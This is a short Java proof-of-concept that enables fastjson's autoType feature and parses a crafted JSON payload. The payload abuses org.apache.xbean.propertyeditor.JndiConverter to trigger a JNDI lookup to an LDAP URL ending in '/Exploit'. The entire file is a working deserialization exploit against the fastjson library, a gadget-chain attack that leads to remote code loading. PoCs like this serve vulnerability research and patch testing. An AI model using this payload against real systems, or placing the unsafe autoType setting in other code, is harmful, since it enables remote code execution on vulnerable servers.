import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;


public class JndiConverterPoc {
    public static void main(String[] args) {
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);

        String payload = "{\"@type\":\"org.apache.xbean.propertyeditor.JndiConverter\",\"asText\":\"ldap://127.0.0.1:1389/Exploit\"}";
        JSON.parse(payload);
    }
}

